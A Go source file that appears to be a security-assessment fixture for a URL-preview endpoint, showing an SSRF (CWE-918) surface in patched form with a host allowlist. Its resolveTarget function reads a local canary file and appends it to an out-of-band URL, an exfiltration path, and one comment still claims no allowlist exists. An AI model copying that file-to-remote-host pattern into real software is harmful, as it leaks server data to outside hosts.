package main

import (
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
)

// canarySeedPath is the per-assessment seed a proof sandbox plants before exercising the
// service. The vulnerable outbound path reads it and carries it off-host, which is how a live
// fire observes that the SSRF sink actually executed (see resolveTarget). A static scan never
// needs it; it is load-bearing only when the service is detonated in a sandbox.
const canarySeedPath = "/tmp/tegron_canary"

// resolveTarget maps the caller-supplied target to the URL the server will fetch. There is no
// allowlist — any target is forwarded to the SSRF sink (CWE-918). The "internal" pseudo-target
// models an SSRF reaching an unintended internal collector: it resolves to the host named by
// TEGRON_OOB_URL with whatever the process can read locally appended, demonstrating that the
// unguarded fetch can exfiltrate data only the server-side request can reach. Any other target
// is forwarded verbatim — still SSRF-capable in general, but it does not touch the seed, so a
// fired beacon is attributable to the vulnerable resolution rather than to generic exfil.
func resolveTarget(name string) (string, bool) {
	if name == "internal" {
		oob := os.Getenv("TEGRON_OOB_URL")
		if oob == "" {
			return "", false
		}
		seed, err := os.ReadFile(canarySeedPath)
		if err != nil {
			return "", false
		}
		return oob + "?kind=canary&data=" + url.QueryEscape(string(seed)), true
	}
	return name, true
}

// allowedFetchHosts is the explicit allowlist of destination hosts the preview endpoint is
// permitted to fetch. Anything not on this list — an attacker-supplied URL, the "internal"
// exfil pseudo-target, a private/reserved address — is refused before any outbound request is
// made. An allowlist (rather than a denylist of internal ranges) is the SSRF (CWE-918) fix
// because it fails closed: a range the denylist forgot cannot slip through.
var allowedFetchHosts = map[string]bool{
	"example.com":     true,
	"www.example.com": true,
}

// validateResolvedURL is the SSRF guard. It requires an http(s) scheme and — the primary
// control — an allowlisted destination host, then re-checks the resolved addresses as defense
// in depth so an allowlisted name cannot be rebased onto a loopback/private/link-local/
// unspecified address. Every attacker-influenced or internal target is refused here, so the
// outbound http.Get only ever reaches a vetted host.
func validateResolvedURL(raw string) error {
	u, err := url.Parse(raw)
	if err != nil {
		return err
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return errors.New("scheme not allowed")
	}
	host := u.Hostname()
	if !allowedFetchHosts[host] {
		return errors.New("target host not on the fetch allowlist")
	}
	ips, err := net.LookupHost(host)
	if err != nil {
		return err
	}
	for _, ipStr := range ips {
		ip := net.ParseIP(ipStr)
		if ip == nil || ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() || ip.IsUnspecified() {
			return errors.New("target resolves to a non-public address")
		}
	}
	return nil
}

// fetchHandler implements the URL-preview endpoint. The caller-supplied target flows through
// resolveTarget, then validateResolvedURL enforces the destination allowlist BEFORE the
// outbound http.Get, so the server cannot be driven to reach an internal or unintended host.
// This is the patched (SSRF-closed) form of the CWE-918 surface.
func fetchHandler(w http.ResponseWriter, r *http.Request) {
	requestsTotal.Inc()

	target := r.URL.Query().Get("target")
	if target == "" {
		http.Error(w, "missing target", http.StatusBadRequest)
		return
	}

	resolved, ok := resolveTarget(target)
	if !ok {
		http.Error(w, "cannot resolve target", http.StatusBadRequest)
		return
	}

	if err := validateResolvedURL(resolved); err != nil {
		http.Error(w, "target not allowed: "+err.Error(), http.StatusBadRequest)
		return
	}

	// Formerly the unguarded SSRF sink; validateResolvedURL above now gates it to allowlisted,
	// public destinations, so an attacker-influenced target never reaches this request.
	resp, err := http.Get(resolved)
	if err != nil {
		http.Error(w, "fetch failed", http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, resp.Body)

	fmt.Fprintf(w, "fetched %s -> %s\n", target, resp.Status)
}
